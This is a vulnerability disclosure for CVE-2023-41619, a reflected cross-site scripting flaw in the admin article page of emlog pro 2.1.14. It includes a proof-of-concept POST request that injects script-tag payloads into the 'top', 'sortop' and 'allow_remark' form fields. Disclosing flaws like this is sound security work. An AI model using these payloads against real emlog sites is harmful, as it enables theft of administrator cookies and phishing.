CVE-2023-41619
[Discoverer]:yunda&haozhe
[NAME OF AFFECTED PRODUCT(S)] :https://github.com/emlog/emlog
[AFFECTED AND/OR FIXED VERSION(S)] : https://github.com/emlog/emlog - pro2.1.14
[Affected Component] :
The affected code: Content-Disposition: form-data; name="top" y'"()&%<acx><ScRiPt >alert(123)</ScRiPt>,Affected url/admin/article.php?action=write
The affected code:y'"Content-Disposition: form-data; name="sortop" ()&%<acx><ScRiPt >alert(666)</ScRiPt>ï¼ŒAffected url/admin/article.php?action=write

[ Vulnerability Type]:Cross Site Scripting (XSS)
[Impact]:Stealing client cookies or engaging in phishing scams.



[Attack Vectors]
 After deploying the local environment, modify the passed data by building the following special post request, causing an xss  vulnerability under the page of the post function POST
JavaScript code can be inserted after the Content Disposition: position in the post request to form an xss attack
/admin/article_save.php The code directory that causes the vulnerability is allow_remark
 The URL contains xss vulnerability, which is triggered when the request content of the construction is below. I deployed the cms to replicate and found that the administrator interface part contains reflective xss



POST /admin/article_save.php 
Referer: http://ip/admin/article.php?action=write

Content-Disposition: form-data; name="top"
y'"()&%<acx><ScRiPt >alert(123)</ScRiPt>

or

Content-Disposition: form-data; name="sortop"
y'"()&%<acx><ScRiPt >alert(666)</ScRiPt>  

This location also has xss

or

Content-Disposition: form-data; name="allow_remark"

y'"()&%<acx><ScRiPt >alert(666)</ScRiPt>
